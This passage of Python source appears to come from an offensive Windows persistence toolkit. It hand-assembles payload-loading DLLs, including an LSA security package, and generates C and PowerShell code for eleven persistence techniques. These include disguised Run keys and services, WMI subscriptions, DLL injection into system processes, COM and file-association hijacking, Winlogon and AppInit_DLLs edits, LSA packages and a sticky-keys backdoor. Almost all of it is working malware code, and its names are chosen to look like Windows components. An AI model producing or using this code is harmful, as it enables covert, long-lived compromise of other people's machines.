        rdata_name = b".rdata\x00\x00"
        sections.extend(rdata_name)
        sections.extend(struct.pack("<II", 0x1000, 0x2000))  # Virtual size, RVA
        sections.extend(struct.pack("<II", 0x200, 0x600))    # Size, pointer to raw data
        sections.extend(struct.pack("<IIHHI", 0, 0, 0, 0, 0x40000040))  # Characteristics (initialized data, read)

        # .data section
        data_name = b".data\x00\x00\x00"
        sections.extend(data_name)
        sections.extend(struct.pack("<II", 0x1000, 0x3000))  # Virtual size, RVA
        sections.extend(struct.pack("<II", 0x200, 0x800))    # Size, pointer to raw data
        sections.extend(struct.pack("<IIHHI", 0, 0, 0, 0, 0xC0000040))  # Characteristics (initialized data, read, write)

        # Build PE file
        pe_file = dos_header + dos_stub
        # Pad to PE header offset
        pe_file.extend([0] * (0x80 - len(pe_file)))

        # Add PE headers
        pe_file.extend(pe_signature)
        pe_file.extend(coff_header)
        pe_file.extend(optional_header)
        pe_file.extend(sections)

        # Pad to first section
        pe_file.extend([0] * (0x400 - len(pe_file)))

        # .text section - DLL entry point and payload loader
        text_section = bytearray()

        # x86 DLL entry point that loads and executes payload
        if machine == 0x014C:  # 32-bit
            # DllMain stub
            text_section.extend([
                0x55,                    # push ebp
                0x8B, 0xEC,             # mov ebp, esp
                0x83, 0x7D, 0x0C, 0x01, # cmp dword [ebp+0xC], 1  ; fdwReason == DLL_PROCESS_ATTACH
                0x75, 0x15,             # jne skip
                # Load and execute payload
                0x68, 0x00, 0x00, 0x00, 0x00,  # push payload_path (will patch)
                0xFF, 0x15, 0x00, 0x20, 0x00, 0x40,  # call [LoadLibraryA]
                0x68, 0x00, 0x00, 0x00, 0x00,  # push payload_path (will patch)
                0xFF, 0x15, 0x04, 0x20, 0x00, 0x40,  # call [WinExec]
                # skip:
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1 (TRUE)
                0x5D,                    # pop ebp
                0xC2, 0x0C, 0x00,       # ret 12
            ])
        else:  # 64-bit
            # DllMain stub
            text_section.extend([
                0x48, 0x89, 0x5C, 0x24, 0x08,  # mov [rsp+8], rbx
                0x48, 0x89, 0x6C, 0x24, 0x10,  # mov [rsp+10h], rbp
                0x48, 0x89, 0x74, 0x24, 0x18,  # mov [rsp+18h], rsi
                0x57,                            # push rdi
                0x48, 0x83, 0xEC, 0x20,         # sub rsp, 20h
                0x83, 0xFA, 0x01,               # cmp edx, 1  ; fdwReason == DLL_PROCESS_ATTACH
                0x75, 0x0A,                     # jne skip
                # Simplified - would call LoadLibrary/WinExec here
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1
                0xEB, 0x05,                     # jmp end
                # skip:
                0xB8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1
                # end:
                0x48, 0x8B, 0x5C, 0x24, 0x30,  # mov rbx, [rsp+30h]
                0x48, 0x8B, 0x6C, 0x24, 0x38,  # mov rbp, [rsp+38h]
                0x48, 0x8B, 0x74, 0x24, 0x40,  # mov rsi, [rsp+40h]
                0x48, 0x83, 0xC4, 0x20,         # add rsp, 20h
                0x5F,                            # pop rdi
                0xC3,                             # ret
            ])

        # Pad text section
        text_section.extend([0x90] * (0x200 - len(text_section)))  # NOP padding
        pe_file.extend(text_section)

        # .rdata section - Import table (simplified)
        rdata_section = bytearray()
        # Import descriptor for kernel32.dll
        rdata_section.extend(b"kernel32.dll\x00")
        rdata_section.extend(b"LoadLibraryA\x00")
        rdata_section.extend(b"WinExec\x00")
        # Embed payload path
        payload_bytes = payload_path.encode("utf-8") + b"\x00"
        rdata_section.extend(payload_bytes)
        # Pad
        rdata_section.extend([0] * (0x200 - len(rdata_section)))
        pe_file.extend(rdata_section)

        # .data section
        data_section = bytearray([0] * 0x200)
        pe_file.extend(data_section)

        return bytes(pe_file)

    def _create_security_package_dll(self, payload_path: str) -> bytes | None:
        """Create a security package DLL."""
        # Validate payload path exists
        if not os.path.exists(payload_path):
            self.logger.error(f"Payload path does not exist: {payload_path}")
            return None

        self.logger.info(f"Creating LSA security package DLL for payload: {payload_path}")

        import struct

        # Create a minimal LSA security package DLL
        # This implements the SpLsaModeInitialize export required by LSA
        # Start with the basic DLL structure from _create_hijack_dll
        base_dll = self._create_hijack_dll(payload_path, "lsapackage")
        if not base_dll:
            return None

        # Convert to bytearray for modification
        dll_data = bytearray(base_dll)

        # Find the export directory location (simplified - would parse PE properly in production)
        # For now, we'll append our export table to the end
        export_section_offset = len(dll_data)

        # Align to section boundary
        alignment = 0x200
        if export_section_offset % alignment != 0:
            padding = alignment - (export_section_offset % alignment)
            dll_data.extend([0] * padding)
            export_section_offset = len(dll_data)

        # Export directory structure
        export_dir = bytearray()

        # IMAGE_EXPORT_DIRECTORY
        export_dir.extend(struct.pack("<I", 0))  # Characteristics
        export_dir.extend(struct.pack("<I", 0))  # TimeDateStamp
        export_dir.extend(struct.pack("<HH", 0, 0))  # Version
        export_dir.extend(struct.pack("<I", export_section_offset + 0x50))  # Name RVA
        export_dir.extend(struct.pack("<I", 1))  # Base
        export_dir.extend(struct.pack("<I", 1))  # NumberOfFunctions
        export_dir.extend(struct.pack("<I", 1))  # NumberOfNames
        export_dir.extend(struct.pack("<I", export_section_offset + 0x28))  # AddressOfFunctions
        export_dir.extend(struct.pack("<I", export_section_offset + 0x2C))  # AddressOfNames
        export_dir.extend(struct.pack("<I", export_section_offset + 0x30))  # AddressOfNameOrdinals

        # Function address table
        export_dir.extend(struct.pack("<I", 0x1000))  # SpLsaModeInitialize RVA

        # Name pointer table
        export_dir.extend(struct.pack("<I", export_section_offset + 0x60))  # Name RVA

        # Ordinal table
        export_dir.extend(struct.pack("<H", 0))  # Ordinal 0

        # Pad to name offset
        while len(export_dir) < 0x50:
            export_dir.extend([0])

        # DLL name
        export_dir.extend(b"lsapackage.dll\x00")

        # Pad to function name offset
        while len(export_dir) < 0x60:
            export_dir.extend([0])

        # Function name
        export_dir.extend(b"SpLsaModeInitialize\x00")

        # Add export section to DLL
        dll_data.extend(export_dir)

        # Update the export data directory in PE header to point to our export section
        # This is simplified - in production would properly parse and update PE structure

        # Add LSA initialization code to .text section
        # The SpLsaModeInitialize function needs to return a SECPKG_FUNCTION_TABLE
        lsa_init_code = bytearray([
            # SpLsaModeInitialize implementation
            0x48, 0x89, 0x5C, 0x24, 0x08,  # mov [rsp+8], rbx
            0x57,                            # push rdi
            0x48, 0x83, 0xEC, 0x20,         # sub rsp, 20h
            # Load payload on LSA init
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,  # lea rcx, [payload_path]
            0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,  # call [LoadLibraryA]
            # Set up function table pointer
            0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,  # lea rax, [function_table]
            0x48, 0x89, 0x01,               # mov [rcx], rax
            # Return success
            0x33, 0xC0,                     # xor eax, eax  ; STATUS_SUCCESS
            0x48, 0x8B, 0x5C, 0x24, 0x30,  # mov rbx, [rsp+30h]
            0x48, 0x83, 0xC4, 0x20,         # add rsp, 20h
            0x5F,                            # pop rdi
            0xC3,                             # ret
        ])

        # Find .text section and add our code
        # This is simplified - would properly parse sections in production
        text_offset = 0x400
        if text_offset + len(lsa_init_code) < len(dll_data):
            dll_data[text_offset:text_offset + len(lsa_init_code)] = lsa_init_code

        return bytes(dll_data)

    def list_persistence_methods(self) -> list[str]:
        """Get list of available persistence methods."""
        return list(self.persistence_methods.keys())

    def generate_persistence_code(self, method: str) -> str:
        """Generate code for specific persistence method."""
        if method == "registry_run":
            return self._generate_registry_run_code()
        if method == "scheduled_task":
            return self._generate_scheduled_task_code()
        if method == "service":
            return self._generate_service_code()
        if method == "wmi_event":
            return self._generate_wmi_event_code()
        if method == "dll_injection":
            return self._generate_dll_injection_code()
        if method == "com_hijack":
            return self._generate_com_hijack_code()
        if method == "winlogon_helper":
            return self._generate_winlogon_helper_code()
        if method == "appinit_dlls":
            return self._generate_appinit_dlls_code()
        if method == "lsa_authentication":
            return self._generate_lsa_authentication_code()
        if method == "accessibility_features":
            return self._generate_accessibility_features_code()
        if method == "file_association":
            return self._generate_file_association_code()
        return f"// Code generation not implemented for method: {method}"

    def _generate_registry_run_code(self) -> str:
        """Generate C code for registry Run persistence."""
        return """
// Registry Run Persistence
#include <windows.h>

BOOL SetRegistryPersistence(LPCSTR exePath) {
    HKEY hKey;
    LONG result;

    // Open registry key
    result = RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    // Set registry value
    result = RegSetValueExA(hKey, "Windows Security Update", 0, REG_SZ,
                           (BYTE*)exePath, strlen(exePath) + 1);

    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

// Usage
SetRegistryPersistence("C:\\\\Windows\\\\System32\\\\payload.exe");
"""

    def _generate_scheduled_task_code(self) -> str:
        """Generate C code for scheduled task persistence."""
        return """
// Scheduled Task Persistence
#include <windows.h>
#include <taskschd.h>

BOOL CreateScheduledTaskPersistence(LPCWSTR taskName, LPCWSTR exePath) {
    HRESULT hr;
    ITaskService *pService = NULL;
    ITaskFolder *pRootFolder = NULL;
    ITaskDefinition *pTask = NULL;
    IRegistrationInfo *pRegInfo = NULL;
    ITriggerCollection *pTriggerCollection = NULL;
    ITrigger *pTrigger = NULL;
    ILogonTrigger *pLogonTrigger = NULL;
    IActionCollection *pActionCollection = NULL;
    IAction *pAction = NULL;
    IExecAction *pExecAction = NULL;
    IRegisteredTask *pRegisteredTask = NULL;
    VARIANT varPassword;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    // Create Task Service
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                         IID_ITaskService, (void**)&pService);

    if (SUCCEEDED(hr)) {
        // Connect to task service
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

        if (SUCCEEDED(hr)) {
            // Get root folder
            hr = pService->GetFolder(_bstr_t(L"\\\\"), &pRootFolder);

            if (SUCCEEDED(hr)) {
                // Create task definition
                hr = pService->NewTask(0, &pTask);

                // Configure task (triggers, actions, etc.)
                // ... detailed task configuration code ...

                // Register task
                VariantInit(&varPassword);
                hr = pRootFolder->RegisterTaskDefinition(
                    _bstr_t(taskName), pTask, TASK_CREATE_OR_UPDATE,
                    _variant_t(), varPassword, TASK_LOGON_INTERACTIVE_TOKEN,
                    _variant_t(L""), &pRegisteredTask);
            }
        }
    }

    // Cleanup COM objects
    // ... cleanup code ...

    CoUninitialize();
    return SUCCEEDED(hr);
}
"""

    def _generate_service_code(self) -> str:
        """Generate C code for service persistence."""
        return """
// Service Persistence
#include <windows.h>

BOOL CreateServicePersistence(LPCSTR serviceName, LPCSTR displayName, LPCSTR exePath) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    BOOL success = FALSE;

    // Open Service Control Manager
    schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (schSCManager) {
        // Create service
        schService = CreateServiceA(
            schSCManager,           // SCManager database
            serviceName,            // Name of service
            displayName,            // Display name
            SERVICE_ALL_ACCESS,     // Desired access
            SERVICE_WIN32_OWN_PROCESS, // Service type
            SERVICE_AUTO_START,     // Start type
            SERVICE_ERROR_NORMAL,   // Error control type
            exePath,                // Binary path
            NULL,                   // No load ordering group
            NULL,                   // No tag identifier
            NULL,                   // No dependencies
            NULL,                   // LocalSystem account
            NULL                    // No password
        );

        if (schService) {
            // Start the service
            StartServiceA(schService, 0, NULL);
            CloseServiceHandle(schService);
            success = TRUE;
        }

        CloseServiceHandle(schSCManager);
    }

    return success;
}

// Usage
CreateServicePersistence("WinUpdateSvc", "Windows Update Service Helper",
                         "C:\\\\Windows\\\\System32\\\\payload.exe");
"""

    def _generate_wmi_event_code(self) -> str:
        """Generate PowerShell code for WMI event persistence."""
        return """
# WMI Event Persistence
$payload = "C:\\Windows\\System32\\payload.exe"

# Create event filter
$filterName = "WindowsSecurityFilter"
$consumerName = "WindowsSecurityConsumer"

$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
}

# Create event consumer
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $payload
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

Write-Host "WMI persistence installed successfully"
"""

    def _generate_dll_injection_code(self) -> str:
        """Generate C code for DLL injection persistence."""
        return """
// DLL Injection Persistence
#include <windows.h>
#include <tlhelp32.h>

BOOL InjectDLL(DWORD processId, LPCSTR dllPath) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return FALSE;

    // Allocate memory in target process
    size_t dllPathLen = strlen(dllPath) + 1;
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPathLen,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRemoteBuf) {
        // Write DLL path to target process
        if (WriteProcessMemory(hProcess, pRemoteBuf, dllPath, dllPathLen, NULL)) {
            // Get LoadLibraryA address
            LPTHREAD_START_ROUTINE pLoadLibraryA =
                (LPTHREAD_START_ROUTINE)GetProcAddress(
                    GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

            if (pLoadLibraryA) {
                // Create remote thread to load DLL
                hThread = CreateRemoteThread(hProcess, NULL, 0,
                                           pLoadLibraryA, pRemoteBuf, 0, NULL);

                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                    success = TRUE;
                }
            }
        }

        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    }

    CloseHandle(hProcess);
    return success;
}

// Find and inject into common processes
BOOL EstablishPersistence(LPCSTR dllPath) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Target common processes
            if (strcmp(pe32.szExeFile, "explorer.exe") == 0 ||
                strcmp(pe32.szExeFile, "winlogon.exe") == 0 ||
                strcmp(pe32.szExeFile, "svchost.exe") == 0) {
                InjectDLL(pe32.th32ProcessID, dllPath);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return TRUE;
}
"""

    def _generate_com_hijack_code(self) -> str:
        """Generate C code for COM hijacking persistence."""
        return """
// COM Hijacking Persistence
#include <windows.h>
#include <shlobj.h>

BOOL SetupCOMHijack(LPCSTR targetCLSID, LPCSTR dllPath) {
    HKEY hKey;
    char regPath[MAX_PATH];
    LONG result;

    // Build registry path for HKCU COM hijack
    sprintf_s(regPath, sizeof(regPath),
              "Software\\\\Classes\\\\CLSID\\\\%s\\\\InProcServer32", targetCLSID);

    // Create/Open registry key
    result = RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        // Set default value to our DLL path
        result = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                               (BYTE*)dllPath, strlen(dllPath) + 1);

        // Set ThreadingModel
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ,
                                   (BYTE*)"Apartment", 10);
        }

        RegCloseKey(hKey);
    }

    return (result == ERROR_SUCCESS);
}

// Common hijackable CLSIDs
const char* targetCLSIDs[] = {
    "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}",  // CAccPropServicesClass
    "{6EDD6D74-C007-4E75-B76A-E5740995E24C}",  // MMDeviceEnumerator
    "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  // MMDeviceEnumerator
    NULL
};

BOOL EstablishCOMPersistence(LPCSTR dllPath) {
    BOOL success = FALSE;

    for (int i = 0; targetCLSIDs[i] != NULL; i++) {
        if (SetupCOMHijack(targetCLSIDs[i], dllPath)) {
            success = TRUE;
            break;
        }
    }

    return success;
}
"""

    def _generate_winlogon_helper_code(self) -> str:
        """Generate C code for Winlogon Helper DLL persistence."""
        return """
// Winlogon Helper DLL Persistence
#include <windows.h>

BOOL SetWinlogonHelper(LPCSTR dllPath) {
    HKEY hKey;
    LONG result;
    char currentValue[MAX_PATH] = {0};
    DWORD valueSize = sizeof(currentValue);

    // Open Winlogon registry key
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                          "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
                          0, KEY_ALL_ACCESS, &hKey);

    if (result != ERROR_SUCCESS) return FALSE;

    // Get current Userinit value
    result = RegQueryValueExA(hKey, "Userinit", NULL, NULL,
                             (LPBYTE)currentValue, &valueSize);

    if (result == ERROR_SUCCESS) {
        // Append our executable to Userinit
        char newValue[MAX_PATH * 2];
        sprintf_s(newValue, sizeof(newValue), "%s,%s", currentValue, dllPath);

        // Set modified value
        result = RegSetValueExA(hKey, "Userinit", 0, REG_SZ,
                               (BYTE*)newValue, strlen(newValue) + 1);
    }

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// Alternative: Set Shell value
BOOL SetWinlogonShell(LPCSTR exePath) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                          "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
                          0, KEY_ALL_ACCESS, &hKey);

    if (result == ERROR_SUCCESS) {
        char shellValue[MAX_PATH];
        sprintf_s(shellValue, sizeof(shellValue), "explorer.exe,%s", exePath);

        result = RegSetValueExA(hKey, "Shell", 0, REG_SZ,
                               (BYTE*)shellValue, strlen(shellValue) + 1);

        RegCloseKey(hKey);
    }

    return (result == ERROR_SUCCESS);
}
"""

    def _generate_appinit_dlls_code(self) -> str:
        """Generate C code for AppInit_DLLs persistence."""
        return """
// AppInit_DLLs Persistence
#include <windows.h>

BOOL SetAppInitDLLs(LPCSTR dllPath) {
    HKEY hKey;
    LONG result;
    DWORD loadValue = 1;

    // Note: AppInit_DLLs requires Administrator privileges and may be disabled
    // on modern Windows versions with Secure Boot

    // Open Windows registry key
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                          "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows",
                          0, KEY_ALL_ACCESS, &hKey);

    if (result != ERROR_SUCCESS) return FALSE;

    // Enable AppInit_DLLs
    result = RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD,
                           (BYTE*)&loadValue, sizeof(DWORD));

    if (result == ERROR_SUCCESS) {
        // Set AppInit_DLLs path
        result = RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                               (BYTE*)dllPath, strlen(dllPath) + 1);

        if (result == ERROR_SUCCESS) {
            // Require signed DLLs (0 = disabled for unsigned DLLs)
            DWORD requireSigned = 0;
            RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD,
                          (BYTE*)&requireSigned, sizeof(DWORD));
        }
    }

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// For 64-bit systems, also set Wow6432Node
BOOL SetAppInitDLLs64(LPCSTR dllPath32, LPCSTR dllPath64) {
    BOOL success = SetAppInitDLLs(dllPath64);

    if (success) {
        // Set 32-bit AppInit_DLLs
        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows",
            0, KEY_ALL_ACCESS, &hKey);

        if (result == ERROR_SUCCESS) {
            DWORD loadValue = 1;
            RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD,
                          (BYTE*)&loadValue, sizeof(DWORD));

            RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                          (BYTE*)dllPath32, strlen(dllPath32) + 1);

            RegCloseKey(hKey);
        }
    }

    return success;
}
"""

    def _generate_lsa_authentication_code(self) -> str:
        """Generate C code for LSA Authentication Package persistence."""
        return """
// LSA Authentication Package Persistence
#include <windows.h>
#include <ntsecapi.h>

// LSA Authentication Package DLL must export these functions
extern "C" {
    NTSTATUS NTAPI LsaApInitializePackage(
        ULONG AuthenticationPackageId,
        PLSA_DISPATCH_TABLE LsaDispatchTable,
        PLSA_STRING Database,
        PLSA_STRING Confidentiality,
        PLSA_STRING *AuthenticationPackageName
    );

    NTSTATUS NTAPI LsaApLogonUserEx2(
        PLSA_CLIENT_REQUEST ClientRequest,
        SECURITY_LOGON_TYPE LogonType,
        PVOID ProtocolSubmitBuffer,
        PVOID ClientBufferBase,
        ULONG SubmitBufferSize,
        PVOID *ProfileBuffer,
        PULONG ProfileBufferSize,
        PLUID LogonId,
        PNTSTATUS SubStatus,
        PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
        PVOID *TokenInformation,
        PUNICODE_STRING *AccountName,
        PUNICODE_STRING *AuthenticatingAuthority,
        PUNICODE_STRING *MachineName,
        PSECPKG_PRIMARY_CRED PrimaryCredentials,
        PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials
    );
}

// Registry installation
BOOL InstallLSAPackage(LPCSTR packageName, LPCSTR dllPath) {
    HKEY hKey;
    LONG result;
    char packages[4096] = {0};
    DWORD packagesSize = sizeof(packages);

    // Open LSA registry key
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                          "SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa",
                          0, KEY_ALL_ACCESS, &hKey);

    if (result != ERROR_SUCCESS) return FALSE;

    // Read current Authentication Packages
    result = RegQueryValueExA(hKey, "Authentication Packages", NULL, NULL,
                             (LPBYTE)packages, &packagesSize);

    if (result == ERROR_SUCCESS) {
        // Add our package to the list
        strcat_s(packages, sizeof(packages), "\\n");
        strcat_s(packages, sizeof(packages), packageName);

        // Write back the modified list
        result = RegSetValueExA(hKey, "Authentication Packages", 0, REG_MULTI_SZ,
                               (BYTE*)packages, strlen(packages) + 2);
    }

    // Also add to Security Packages for some scenarios
    if (result == ERROR_SUCCESS) {
        packagesSize = sizeof(packages);
        memset(packages, 0, sizeof(packages));

        result = RegQueryValueExA(hKey, "Security Packages", NULL, NULL,
                                 (LPBYTE)packages, &packagesSize);

        if (result == ERROR_SUCCESS) {
            strcat_s(packages, sizeof(packages), " ");
            strcat_s(packages, sizeof(packages), packageName);

            RegSetValueExA(hKey, "Security Packages", 0, REG_MULTI_SZ,
                          (BYTE*)packages, strlen(packages) + 1);
        }
    }

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}
"""

    def _generate_accessibility_features_code(self) -> str:
        """Generate C code for Accessibility Features persistence."""
        return """
// Accessibility Features Persistence (Sticky Keys backdoor)
#include <windows.h>

BOOL SetAccessibilityBackdoor(LPCSTR backdoorPath) {
    const char* targets[] = {
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe",
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman.exe",
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\osk.exe",
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\narrator.exe",
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\magnify.exe",
        NULL
    };

    BOOL success = FALSE;

    for (int i = 0; targets[i] != NULL; i++) {
        HKEY hKey;
        LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, targets[i], 0, NULL,
                                     REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                                     NULL, &hKey, NULL);

        if (result == ERROR_SUCCESS) {
            // Set debugger to our backdoor
            result = RegSetValueExA(hKey, "Debugger", 0, REG_SZ,
                                   (BYTE*)backdoorPath, strlen(backdoorPath) + 1);

            RegCloseKey(hKey);

            if (result == ERROR_SUCCESS) {
                success = TRUE;
            }
        }
    }

    return success;
}

// Alternative: Direct file replacement
BOOL ReplaceAccessibilityExe(LPCSTR targetExe, LPCSTR backdoorPath) {
    char systemPath[MAX_PATH];
    char backupPath[MAX_PATH];

    // Get system directory
    GetSystemDirectoryA(systemPath, sizeof(systemPath));
    strcat_s(systemPath, sizeof(systemPath), "\\\\");
    strcat_s(systemPath, sizeof(systemPath), targetExe);

    // Backup original
    strcpy_s(backupPath, sizeof(backupPath), systemPath);
    strcat_s(backupPath, sizeof(backupPath), ".bak");

    // Take ownership and replace file
    if (MoveFileExA(systemPath, backupPath, MOVEFILE_REPLACE_EXISTING)) {
        if (CopyFileA(backdoorPath, systemPath, FALSE)) {
            return TRUE;
        }
        // Restore on failure
        MoveFileExA(backupPath, systemPath, MOVEFILE_REPLACE_EXISTING);
    }

    return FALSE;
}
"""

    def _generate_file_association_code(self) -> str:
        """Generate C code for File Association hijacking persistence."""
        return """
// File Association Hijacking Persistence
#include <windows.h>

BOOL HijackFileAssociation(LPCSTR extension, LPCSTR backdoorPath) {
    HKEY hKey;
    char regPath[MAX_PATH];
    char progId[64];
    char command[MAX_PATH];
    LONG result;

    // Create ProgID for our handler
    sprintf_s(progId, sizeof(progId), "%sfile_handler", extension);

    // Step 1: Create file association
    sprintf_s(regPath, sizeof(regPath), "Software\\\\Classes\\\\%s", extension);
    result = RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        // Set default value to our ProgID
        result = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                               (BYTE*)progId, strlen(progId) + 1);
        RegCloseKey(hKey);
    }

    // Step 2: Create ProgID handler
    if (result == ERROR_SUCCESS) {
        sprintf_s(regPath, sizeof(regPath), "Software\\\\Classes\\\\%s\\\\shell\\\\open\\\\command", progId);
        result = RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

        if (result == ERROR_SUCCESS) {
            // Set command to run our backdoor and then the real handler
            sprintf_s(command, sizeof(command), "\\"%s\\" \\"%s\\" \\\"%%1\\"",
                     backdoorPath, "C:\\\\Windows\\\\System32\\\\notepad.exe");

            result = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                                   (BYTE*)command, strlen(command) + 1);
            RegCloseKey(hKey);
        }
    }

    return (result == ERROR_SUCCESS);
}

// Common file extensions to hijack
BOOL EstablishFileAssociationPersistence(LPCSTR backdoorPath) {
    const char* extensions[] = {
        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
        ".jpg", ".png", ".mp3", ".mp4", NULL
    };

    BOOL success = FALSE;

    for (int i = 0; extensions[i] != NULL; i++) {
        if (HijackFileAssociation(extensions[i], backdoorPath)) {
            success = TRUE;
            // Don't hijack all - too suspicious
            if (i >= 2) break;
        }
    }

    return success;
}
"""
